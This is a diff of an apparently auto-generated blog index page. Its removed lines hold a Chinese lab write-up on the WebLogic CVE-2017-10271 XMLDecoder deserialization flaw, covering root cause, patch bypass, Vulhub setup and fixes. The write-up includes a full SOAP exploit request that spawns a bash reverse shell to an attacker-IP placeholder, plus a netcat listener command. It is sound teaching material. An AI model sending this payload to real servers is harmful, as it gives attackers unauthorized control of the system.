@@ -96,52 +96,16 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h2 id="1-漏洞概述"><a href="#1-漏洞概述" class="headerlink" title="1. 漏洞概述"></a>1. 漏洞概述</h2><ul>
-<li><strong>漏洞编号</strong>：CVE-2017-10271（关联 CVE-2017-3506 为早期不完整补丁）</li>
-<li><strong>漏洞类型</strong>：XMLDecoder 反序列化导致远程命令执行</li>
-<li><strong>影响产品</strong>：Oracle WebLogic Server</li>
-<li><strong>影响组件</strong>：WLS-WebServices（wls-wsat.war）</li>
-<li><strong>主要影响</strong>：未认证攻击者可向 <code>/wls-wsat/</code> 系列端点发送特制 SOAP 请求，通过 XMLDecoder 反序列化机制执行任意系统命令，进而完全控制服务器</li>
-</ul>
-<h2 id="2-漏洞组件介绍"><a href="#2-漏洞组件介绍" class="headerlink" title="2. 漏洞组件介绍"></a>2. 漏洞组件介绍</h2><h3 id="2-1-组件用途"><a href="#2-1-组件用途" class="headerlink" title="2.1 组件用途"></a>2.1 组件用途</h3><p>WLS-WebServices（部署为 <code>wls-wsat.war</code>）是 WebLogic Server 内置的 Web 服务组件，负责处理与 WS-AT（Web Services Atomic Transaction）等规范相关的 SOAP 请求。该组件由 Oracle 随 WebLogic 默认安装并启动，监听在应用服务器的 HTTP 端口上，外部或未认证的客户端可直接向其发送 SOAP 消息。</p>
-<h3 id="2-2-关键机制"><a href="#2-2-关键机制" class="headerlink" title="2.2 关键机制"></a>2.2 关键机制</h3><p>SOAP 请求中的 <code>&lt;soapenv:Header&gt;</code> 可以携带 <code>&lt;work:WorkContext&gt;</code> 扩展头部。当 WebLogic 处理该头部时，代码路径经过 <code>WorkContextServerTube.processRequest</code> → <code>WorkContextTube.readHeaderOld</code> → <code>WorkContextXmlInputAdapter</code>，最终调用 <code>java.beans.XMLDecoder</code> 对 WorkContext 内容进行反序列化还原。</p>
-<p><code>XMLDecoder</code> 的设计用途是从 XML 表示中还原 Java 对象图，但它可以实例化任意类并调用其方法，因此不能用于解析不受信任的数据。这里 WebLogic 将来自外部 HTTP 请求的 XML 直接交给 XMLDecoder，就形成了一个危险的反序列化入口。</p>
-<h2 id="3-漏洞原理"><a href="#3-漏洞原理" class="headerlink" title="3. 漏洞原理"></a>3. 漏洞原理</h2><blockquote>
-<p><strong>一句话总结：外部未认证的 SOAP 请求中 <code>&lt;work:WorkContext&gt;</code> 头部内的 XML 数据，在经过 <code>WorkContextXmlInputAdapter</code> 后被直接传入 <code>java.beans.XMLDecoder</code> 解析，由于 XMLDecoder 的特性允许实例化任意 Java 类并调用方法，攻击者可以构造包含 <code>java.lang.ProcessBuilder</code> 的 XML 负载，在服务器端执行任意系统命令。</strong></p>
-</blockquote>
-<h3 id="3-1-正常处理流程"><a href="#3-1-正常处理流程" class="headerlink" title="3.1 正常处理流程"></a>3.1 正常处理流程</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SOAP 请求到达 WebLogic</span><br><span class="line">    -&gt; WLS-WebServices 组件接收 SOAP 消息</span><br><span class="line">    -&gt; 提取 &lt;soapenv:Header&gt; 中的 &lt;work:WorkContext&gt; 数据</span><br><span class="line">    -&gt; 通过 WorkContextXmlInputAdapter 包装</span><br><span class="line">    -&gt; 调用 XMLDecoder 反序列化为 Java 对象</span><br><span class="line">    -&gt; 将对象用于后续的事务上下文处理</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-2-漏洞调用链"><a href="#3-2-漏洞调用链" class="headerlink" title="3.2 漏洞调用链"></a>3.2 漏洞调用链</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">外部 SOAP POST 请求（未认证）</span><br><span class="line">    -&gt; weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest</span><br><span class="line">    -&gt; weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld</span><br><span class="line">    -&gt; weblogic.wsee.workarea.WorkContextXmlInputAdapter 构造方法</span><br><span class="line">    -&gt; java.beans.XMLDecoder.readObject</span><br><span class="line">    -&gt; 恶意 XML 中指定的类被实例化、方法被调用</span><br><span class="line">    -&gt; 系统命令执行</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-3-根本原因"><a href="#3-3-根本原因" class="headerlink" title="3.3 根本原因"></a>3.3 根本原因</h3><p><strong>可达性</strong>：<code>/wls-wsat/CoordinatorPortType</code> 和 <code>/wls-wsat/CoordinatorPortType11</code> 等端点对外暴露，无需认证即可访问。请求中 <code>&lt;work:WorkContext&gt;</code> 头部的 XML 数据会直接进入上述处理链，没有在入口处进行有效性校验或格式约束。</p>
-<p><strong>危险能力</strong>：<code>java.beans.XMLDecoder</code> 能够根据 XML 描述创建任意 Java 对象并调用其方法。攻击者只需构造 XML 中的 <code>&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</code> 节点，指定系统命令字符串数组并调用 <code>start()</code> 方法，即可命令执行。</p>
-<p><strong>缺失的信任边界</strong>：WebLogic 将来自不可信外部网络的 XML 数据当作可信的反序列化输入，未采用任何安全类型白名单、Schema 校验或沙箱限制。XMLDecoder 天然不适合处理不受信任的输入，但此处的架构设计中缺少了这一关键的信任边界。</p>
-<h3 id="3-4-认证与信任边界"><a href="#3-4-认证与信任边界" class="headerlink" title="3.4 认证与信任边界"></a>3.4 认证与信任边界</h3><p>此漏洞的攻击面完全存在于认证之前——访问 <code>/wls-wsat/</code> 端点不需要任何凭据。但即便增加了认证，认证仅能识别请求方身份，无法限制 XMLDecoder 解析恶意构造的 XML 后执行任意操作的能力。因此 <strong>认证不能替代安全解析</strong>，根因在于不可信数据进入了危险的反序列化器。</p>
-<h3 id="3-5-CVE-2017-3506-的补丁绕过"><a href="#3-5-CVE-2017-3506-的补丁绕过" class="headerlink" title="3.5 CVE-2017-3506 的补丁绕过"></a>3.5 CVE-2017-3506 的补丁绕过</h3><p>Oracle 在 2017 年 4 月发布的 CVE-2017-3506 补丁仅检查了 XML 中是否包含 <code>&lt;object&gt;</code> 标签，未从根本上移除 XMLDecoder 的使用。攻击者将 <code>&lt;object&gt;</code> 替换为 <code>&lt;void&gt;</code> 即可完全绕过该补丁，这也促成了同年 10 月 CVE-2017-10271 的完整修复。</p>
-<h2 id="4-漏洞利用必要环境配置"><a href="#4-漏洞利用必要环境配置" class="headerlink" title="4. 漏洞利用必要环境配置"></a>4. 漏洞利用必要环境配置</h2><ol>
-<li><strong>产品与版本</strong>：WebLogic Server 10.3.6.0 及之前受影响版本（以实际靶场版本和官方公告为准）。</li>
-<li><strong>组件状态</strong>：<code>wls-wsat.war</code> 已部署并启动（WebLogic 默认启动该组件）。</li>
-<li><strong>网络条件</strong>：WebLogic HTTP 监听端口（默认 7001）对攻击者可达。</li>
-</ol>
-<h2 id="5-使用-Vulhub-或本地靶场验证"><a href="#5-使用-Vulhub-或本地靶场验证" class="headerlink" title="5. 使用 Vulhub 或本地靶场验证"></a>5. 使用 Vulhub 或本地靶场验证</h2><h3 id="5-1-环境准备"><a href="#5-1-环境准备" class="headerlink" title="5.1 环境准备"></a>5.1 环境准备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-2017-10271</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="5-2-服务确认"><a href="#5-2-服务确认" class="headerlink" title="5.2 服务确认"></a>5.2 服务确认</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://&lt;LAB_IP&gt;:7001/</span><br></pre></td></tr></table></figure>
-
-<p>返回 HTTP 404 页面且不报连接错误，说明 WebLogic 已正常运行。</p>
-<h3 id="5-3-验证-Payload"><a href="#5-3-验证-Payload" class="headerlink" title="5.3 验证 Payload"></a>5.3 验证 Payload</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> your-ip<span class="punctuation">:</span><span class="number">7001</span></span><br><span class="line">Accept-Encoding<span class="punctuation">:</span> gzip<span class="punctuation">,</span> deflate</span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: text/xml</span></span><br><span class="line"><span class="comment">Content-Length: 633</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;void index=&quot;0&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="comment">&lt;/void&gt;</span></span><br><span class="line"><span class="comment">&lt;void index=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="comment">&lt;/void&gt;</span></span><br><span class="line"><span class="comment">&lt;void index=&quot;2&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/你的攻击机ip/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="comment">&lt;/void&gt;</span></span><br><span class="line"><span class="comment">&lt;/array&gt;</span></span><br><span class="line"><span class="comment">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span></span><br><span class="line"><span class="comment">&lt;/java&gt;</span></span><br><span class="line"><span class="comment">&lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">&lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Envelope&gt;</span></span><br></pre></td></tr></table></figure>
-<p>攻击机：<code>nc -lvnp 4444</code><br>数据包发送后会反弹shell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dzlzlzl301-creator/hexo-image@main/img20260717214919710.png" alt="111.png"></p>
-<h2 id="6-根本防护手段"><a href="#6-根本防护手段" class="headerlink" title="6. 根本防护手段"></a>6. 根本防护手段</h2><h3 id="6-1-官方完整修复"><a href="#6-1-官方完整修复" class="headerlink" title="6.1 官方完整修复"></a>6.1 官方完整修复</h3><p>安装 Oracle 2017 年 10 月发布的 Critical Patch Update，其中包含 CVE-2017-10271 的完整修复。注意不要仅安装同年 4 月的补丁（对应 CVE-2017-3506），该补丁已被绕过。升级后，确认集群中每个节点都实际加载了修复后的组件。</p>
-<h3 id="6-2-消除不安全数据路径"><a href="#6-2-消除不安全数据路径" class="headerlink" title="6.2 消除不安全数据路径"></a>6.2 消除不安全数据路径</h3><p>根本的修复是在 <code>WorkContextXmlInputAdapter</code> 及相关调用链中移除 XMLDecoder 的使用，改用基于固定 Schema 的解析方式，仅允许预定义的白名单 DTO 类型和字段。不应允许不受信任的 XML 数据控制类加载、对象实例化或方法调用。</p>
-<h2 id="8-参考链接"><a href="#8-参考链接" class="headerlink" title="8. 参考链接"></a>8. 参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md">2017-12-22-WebLogic WLS-WebServices组件反序列化漏洞分析.md</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271/README.zh-cn.md">README.zh-cn.md (vulhub&#x2F;CVE-2017-10271)</a></li>
-</ul>
-
+<li><strong>漏洞编号</strong>：CVE-2017-10271（关联 CVE-2017-3506 为早期不完整补丁）
+        
+          <p class="article-more-link">
+            <a href="/2026/07/17/WebLogic-CVE-2017-10271/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/17/WebLogic-CVE-2017-10271/" data-id="cuidXHRzrIGFUhpQsk7xo9HQO" data-title="WebLogic-CVE-2017-10271" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/17/WebLogic-CVE-2017-10271/" data-id="cuid0yJ47pBjuPdRJ_YJL-KMk" data-title="WebLogic-CVE-2017-10271" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -186,7 +150,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/16/Apache-Shiro1.2.4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2016-4437/" data-id="cuidbPfX0BTVzsiFspWtCllBG" data-title="Apache Shiro 1.2.4 反序列化漏洞-CVE-2016-4437" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/16/Apache-Shiro1.2.4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2016-4437/" data-id="cuidkpbSGqMo0GeWW_LFVR1J4" data-title="Apache Shiro 1.2.4 反序列化漏洞-CVE-2016-4437" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -231,7 +195,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/13/S2-057-CVE-2018-11776/" data-id="cuidpcw2iNk_i59TxKDVDhoFr" data-title="S2-057-CVE-2018-11776" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/13/S2-057-CVE-2018-11776/" data-id="cuidQKDFN80r2s8juWpZPRrNW" data-title="S2-057-CVE-2018-11776" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -276,7 +240,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/12/Struts2-S2-045-CVE-2017-5638/" data-id="cuidNpJ6gw-gRdhsq9R5DdXGn" data-title="CVE-2017-5638-Struts2_S2-045漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/12/Struts2-S2-045-CVE-2017-5638/" data-id="cuid-eoWz5iC_F--JIO5liyGN" data-title="CVE-2017-5638-Struts2_S2-045漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -321,7 +285,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/11/Spring4Shell-CVE-2022-22965/" data-id="cuidYqJD-Dg9q5g3IxPSHEE4Y" data-title="Spring4Shell_CVE-2022-22965" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/11/Spring4Shell-CVE-2022-22965/" data-id="cuidsdOmjmT2tNSdbO9aFvshw" data-title="Spring4Shell_CVE-2022-22965" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -367,7 +331,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/10/Spring-Cloud-Gateway-CVE-2022-22947/" data-id="cuidKhm7B5rlTDv35sUFyMO14" data-title="CVE-2022-22947_Spring_Cloud_Gateway" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/10/Spring-Cloud-Gateway-CVE-2022-22947/" data-id="cuid492rERuH36-zWBoF-SwWa" data-title="CVE-2022-22947_Spring_Cloud_Gateway" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -412,7 +376,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/08/Log4j2-CVE-2021-44228/" data-id="cuidrcFW_tMjsKz4CVLoGzHw3" data-title="Log4j2漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/07/08/Log4j2-CVE-2021-44228/" data-id="cuidSVAQQvNRjpqViQrzrk-8V" data-title="Log4j2漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
